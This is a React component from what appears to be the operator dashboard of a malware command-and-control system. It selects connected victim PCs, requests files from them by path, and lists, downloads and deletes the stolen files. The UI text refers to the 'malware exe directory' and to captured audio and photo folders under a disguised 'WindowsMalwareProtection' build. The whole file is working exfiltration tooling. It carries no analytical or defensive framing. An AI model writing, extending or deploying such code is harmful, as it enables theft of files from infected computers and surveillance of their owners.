import { useEffect, useState } from 'react'
import { Folder, Download, Trash2, RefreshCw, File, AlertCircle } from 'lucide-react'
import { getPCs, requestFileDownload, listFiles, downloadFile, deleteFile as deleteFileAPI } from '../services/api'
import { useToast } from '../components/ToastContainer'

const Directory = () => {
  const [pcs, setPCs] = useState([])
  const [selectedPC, setSelectedPC] = useState('')
  const [filePath, setFilePath] = useState('')
  const [downloading, setDownloading] = useState(false)
  const [files, setFiles] = useState([])
  const [loading, setLoading] = useState(true)
  const { showToast } = useToast()

  useEffect(() => {
    loadPCs()
    loadFiles()
  }, [])

  const loadPCs = async () => {
    try {
      const data = await getPCs(true) // Only connected PCs
      setPCs(data.pcs || [])
      if (data.pcs && data.pcs.length > 0 && !selectedPC) {
        setSelectedPC(data.pcs[0].pc_id)
      }
    } catch (error) {
      console.error('Error loading PCs:', error)
      showToast('Error loading PCs', 'error')
    }
  }

  const loadFiles = async () => {
    setLoading(true)
    try {
      const data = await listFiles()
      setFiles(data.files || [])
    } catch (error) {
      console.error('Error loading files:', error)
      showToast('Error loading files', 'error')
    } finally {
      setLoading(false)
    }
  }

  const handleDownload = async () => {
    if (!selectedPC) {
      showToast('Please select a PC', 'warning')
      return
    }
    if (!filePath.trim()) {
      showToast('Please enter a file path', 'warning')
      return
    }

    setDownloading(true)
    try {
      const response = await requestFileDownload(selectedPC, filePath.trim())
      showToast(`File download requested. Request ID: ${response.request_id}`, 'info')
      
      // Wait a bit and refresh files list
      setTimeout(() => {
        loadFiles()
      }, 2000)
      
      // Clear input
      setFilePath('')
    } catch (error) {
      console.error('Error requesting file download:', error)
      showToast(error.response?.data?.detail || 'Error requesting file download', 'error')
    } finally {
      setDownloading(false)
    }
  }

  const handleDownloadFile = async (fileId, pcId, fileName) => {
    try {
      const response = await downloadFile(fileId, pcId)
      // Create blob from response
      const blob = new Blob([response.data])
      const url = window.URL.createObjectURL(blob)
      const link = document.createElement('a')
      link.href = url
      link.setAttribute('download', fileName)
      document.body.appendChild(link)
      link.click()
      link.remove()
      window.URL.revokeObjectURL(url)
      showToast('File downloaded successfully', 'success')
    } catch (error) {
      console.error('Error downloading file:', error)
      showToast(error.response?.data?.detail || 'Error downloading file', 'error')
    }
  }

  const handleDeleteFile = async (fileId, pcId) => {
    if (!confirm('Delete this file?')) return
    
    try {
      await deleteFileAPI(fileId, pcId)
      showToast('File deleted successfully', 'success')
      loadFiles()
    } catch (error) {
      console.error('Error deleting file:', error)
      showToast('Error deleting file', 'error')
    }
  }

  const formatDate = (dateString) => {
    if (!dateString) return 'N/A'
    return new Date(dateString).toLocaleString()
  }

  const formatSize = (sizeMB) => {
    if (sizeMB < 1) {
      return `${(sizeMB * 1024).toFixed(2)} KB`
    }
    return `${sizeMB.toFixed(2)} MB`
  }

  return (
    <div className="space-y-4 sm:space-y-6">
      {/* Download Section */}
      <div className="bg-hack-dark/90 backdrop-blur-sm border border-hack-green/30 rounded-xl p-4 sm:p-6 shadow-2xl">
        <div className="flex items-center gap-3 mb-4">
          <div className="p-2 bg-hack-green/10 rounded-lg border border-hack-green/20">
            <Folder className="text-hack-green" size={24} />
          </div>
          <div>
            <h2 className="text-xl sm:text-2xl font-bold text-white font-mono">File Download</h2>
            <p className="text-gray-400 text-xs sm:text-sm mt-1">Download files from connected PCs</p>
          </div>
        </div>

        <div className="space-y-4">
          {/* PC Selection */}
          <div>
            <label className="block text-gray-400 font-mono text-sm mb-2">Select PC</label>
            <select
              value={selectedPC}
              onChange={(e) => setSelectedPC(e.target.value)}
              className="w-full bg-black/50 border border-white/10 hover:border-hack-green/50 text-white px-4 py-2 rounded-lg font-mono text-sm focus:outline-none focus:border-hack-green/50"
            >
              <option value="" className="bg-hack-dark">Select a PC</option>
              {pcs.map((pc) => (
                <option key={pc.pc_id} value={pc.pc_id} className="bg-hack-dark">
                  {pc.name || pc.pc_id} {pc.connected ? '(Online)' : '(Offline)'}
                </option>
              ))}
            </select>
          </div>

          {/* File Path Input */}
          <div>
            <label className="block text-gray-400 font-mono text-sm mb-2">File Path (Relative to Executable Directory)</label>
            <div className="flex gap-2">
              <input
                type="text"
                value={filePath}
                onChange={(e) => setFilePath(e.target.value)}
                placeholder="Audios/audio (1).mp3, Photos/1.jpg, or build/WindowsMalwareProtection/file.pkg"
                className="flex-1 bg-black/50 border border-white/10 hover:border-hack-green/50 text-white px-4 py-2 rounded-lg font-mono text-sm focus:outline-none focus:border-hack-green/50"
                onKeyPress={(e) => e.key === 'Enter' && handleDownload()}
              />
              <button
                onClick={handleDownload}
                disabled={downloading || !selectedPC || !filePath.trim()}
                className="bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-4 sm:px-6 py-2 rounded-lg font-mono text-sm transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
              >
                {downloading ? (
                  <>
                    <RefreshCw size={16} className="animate-spin" />
                    <span className="hidden sm:inline">Downloading...</span>
                  </>
                ) : (
                  <>
                    <Download size={16} />
                    <span className="hidden sm:inline">Download</span>
                  </>
                )}
              </button>
            </div>
            <p className="text-gray-500 text-xs mt-2 font-mono">
              Maximum file size: 100 MB | Only paths from executable directory: Audios/, Photos/, build/, logs/
            </p>
            <p className="text-red-400/70 text-xs mt-1 font-mono">
              ⚠️ Do NOT use user folder paths (C:\Users\...). Only use paths relative to malware exe directory.
            </p>
          </div>
        </div>
      </div>

      {/* Files List */}
      <div className="bg-hack-dark/90 backdrop-blur-sm border border-hack-green/30 rounded-xl p-4 sm:p-6 shadow-2xl">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-hack-green/10 rounded-lg border border-hack-green/20">
              <File className="text-hack-green" size={24} />
            </div>
            <div>
              <h2 className="text-xl sm:text-2xl font-bold text-white font-mono">Downloaded Files</h2>
              <p className="text-gray-400 text-xs sm:text-sm mt-1">{files.length} file(s)</p>
            </div>
          </div>
          <button
            onClick={loadFiles}
            className="bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-3 sm:px-4 py-2 rounded-lg font-mono text-xs sm:text-sm transition-all flex items-center gap-2"
          >
            <RefreshCw size={16} />
            <span className="hidden sm:inline">Refresh</span>
          </button>
        </div>

        {loading ? (
          <div className="text-center py-8">
            <RefreshCw className="mx-auto text-hack-green animate-spin mb-4" size={32} />
            <p className="text-gray-400 font-mono">Loading files...</p>
          </div>
        ) : files.length === 0 ? (
          <div className="text-center py-8">
            <File className="mx-auto text-gray-500 mb-4" size={48} />
            <p className="text-gray-400 font-mono">No files downloaded yet</p>
          </div>
        ) : (
          <div className="space-y-2">
            {files.map((file) => (
              <div
                key={`${file.pc_id}-${file.file_id}`}
                className="bg-black/50 border border-white/10 hover:border-hack-green/30 rounded-lg p-4 transition-all"
              >
                <div className="flex items-start justify-between gap-4">
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 mb-2">
                      <File className="text-hack-green flex-shrink-0" size={18} />
                      <h3 className="text-white font-mono font-semibold truncate">{file.file_name}</h3>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs font-mono">
                      <div>
                        <span className="text-gray-400">PC: </span>
                        <span className="text-gray-300">{file.pc_id}</span>
                      </div>
                      <div>
                        <span className="text-gray-400">Size: </span>
                        <span className="text-gray-300">{formatSize(file.size_mb)}</span>
                      </div>
                      <div className="sm:col-span-2">
                        <span className="text-gray-400">Path: </span>
                        <span className="text-gray-300 break-all">{file.original_path || 'N/A'}</span>
                      </div>
                      <div>
                        <span className="text-gray-400">Downloaded: </span>
                        <span className="text-gray-300">{formatDate(file.downloaded_at)}</span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 flex-shrink-0">
                    <button
                      onClick={() => handleDownloadFile(file.file_id, file.pc_id, file.file_name)}
                      className="bg-hack-green/10 hover:bg-hack-green/20 border border-hack-green/30 text-hack-green px-3 py-2 rounded-lg font-mono text-xs transition-all flex items-center gap-2"
                      title="Download file"
                    >
                      <Download size={14} />
                      <span className="hidden sm:inline">Download</span>
                    </button>
                    <button
                      onClick={() => handleDeleteFile(file.file_id, file.pc_id)}
                      className="bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-400 px-3 py-2 rounded-lg font-mono text-xs transition-all"
                      title="Delete file"
                    >
                      <Trash2 size={14} />
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}

export default Directory

